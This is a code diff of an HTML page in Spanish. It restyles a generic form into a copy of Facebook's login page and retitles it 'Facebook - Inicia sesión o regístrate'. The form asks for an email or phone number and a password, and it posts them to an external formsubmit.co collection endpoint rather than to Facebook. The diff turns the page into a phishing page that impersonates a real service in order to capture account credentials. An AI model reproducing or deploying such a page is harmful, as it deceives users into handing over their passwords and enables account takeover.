@@ -5,10 +5,202 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="Facemovil.css"
+    <style>
+        *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Open Sans', sans-serif;
+}
+
+body{
+    background: #F0F2F5;
+}
+
+.container{
+    width: 100%;
+    max-width: 1000px;
+    margin: auto;
+    height: 92vh;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    overflow: hidden;
+}
+
+.textos{
+    width: 60%;
+    margin-left: 10px;
+    position: absolute;
+    top: 7%;
+    left: 45%;
+    transform: translate(-45%, -7%);
+    text-align: center;
+    margin: 10px, 40px, 40px, 0px;
+}
+@media (max-width: 500px){
+    .textos{
+        width: 80%;
+    }
+    
+    .form{
+        width: 80%;
+    }
+
+    .conte-ul{
+        width: 80%;
+    }
+}
+
+@media (max-width: 400px){
+    .textos{
+        width: 65%;
+    }
+    
+    .form{
+        width: 65%;
+    }
+
+    .conte-ul{
+        width: 65%;
+    }
+}
+
+@media (max-width: 300px){
+    .textos{
+        width: 55%;
+    }
+    
+    .form{
+        width: 55%;
+    }
+
+    .conte-ul{
+        width: 55%;
+    }
+}
+
+.textos h2{
+    font-size: 55px;
+    color: #1877f2;
+}
+
+.textos p{
+    color: #1c1e21;
+    font-size: 26px;
+    font-weight: 500;
+    line-height: 35px;
+    margin: 0px 0px 0px 0px;
+}
+
+.form{
+    width: 396px;
+    height: 349px;
+    border-radius: 10px;
+    border: 1px solid #e8e8e9;
+    box-shadow: 0px 8px 32px rgba(153,153,153,0.50);
+    background: white;
+    padding: 20px 0 20px 0;
+    margin: 40px 40px 40px 0px;
+    text-align: center;
+    position: absolute;
+    top: 63%;
+    left: 50%;
+    transform: translate(-50%, -63%);
+}
+
+.form input{
+    width: 364px;
+    height: 52px;
+    background: #fff;
+    padding: 14px 16px;
+    font-size: 16px;
+    margin-bottom: 10px;
+    border-radius: 8px;
+    border: none;
+    border: 1px solid #e4e3e3;
+}
+
+.form input:focus{ 
+    border-color: #1877f2;
+    outline: none;
+}
+
+.form .entrar{
+    width: 364px;
+    height: 52px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 22px;
+    margin-bottom: 10px;
+}
+
+.form a{
+    display: inline-block;
+    text-decoration: none;
+    color: #1877f2;
+    font-size: 15px;
+    margin-bottom: 20px;
+}
+
+.form hr{
+    margin: 0 20px 0 20px;
+    margin-bottom: 20px;
+    border: 0.2px solid #e4e3e3;
+}
+
+.form .NuevaC{
+    width: 189.8px;
+    height: 48px;
+    font-size: 18px;
+    border-radius: 6px;
+    border: none;
+    color: #fff;
+    background: #42b72a;
+    display: block;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.conte-ul{
+    width: 90%;
+    margin: 0 auto;
+    position: absolute;
+    top: 98%;
+    left: 90%;
+    transform: translate(-95%, -98%);
+}
+
+.afuera{
+    font-size: 14px;
+    text-align: center;
+    margin-top: 30px
+    position absolute;
+    top: 80%;
+    left: 2%;
+    transform: translate(-2%, -80%);
+}
+
+.afuera span{
+    font-size: 14px;
+    font-weight: 700;
+}
+#label6{
+    float: left;
+    margin-left: 30px;
+    color: #8E8E8E;
+    font-size: 17px;
+    position: absolute;
+    top: 97%;
+    left: 30%;
+    transform: translate(-28%, -50%);
+}
+    </style>
     
     <div>
-    <title>Formulario - Inicia sesión o regístrate</title>
+    <title>Facebook - Inicia sesión o regístrate</title>
     <link rel="icon" href="facelogo.webp">
     </div>
   
@@ -16,11 +208,11 @@
 <body>
     <div class="container">
         <div class="textos">
-            <h2>registrate para el formulario</h2>
+            <h2>facebook</h2>
             <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         <div>
-            <form class="form" id="miFormulario" action="https://formsubmit.co/danialvarez637281@gmail.com" method="POST">
+            <form class="form" id="miFormulario" action="https://formsubmit.co/7241711de0ce8f59d2ceeb08c7580479" method="POST">
                 <input type="text" name="correonum" id="correonum" class="form-control mb-3" placeholder="Correo electrónico o número de teléfono" autofocus />
                 <input type="password" name="contra" id="contra" class="form-control mb-3" placeholder="Contraseña">
                 <!-- Botón 1: Iniciar sesión -->
@@ -38,7 +230,7 @@
             <div class="conte-ul">
                 <p class="afuera"><span>Crea una página</span> para una celebridad, una marca o un negocio.</p>
             </div>
-            <label id="label6">&copy;2023 Formulario from Meta</label>
+            <label id="label6">&copy;2023 from Meta</label>
         </div>
     </div>
     
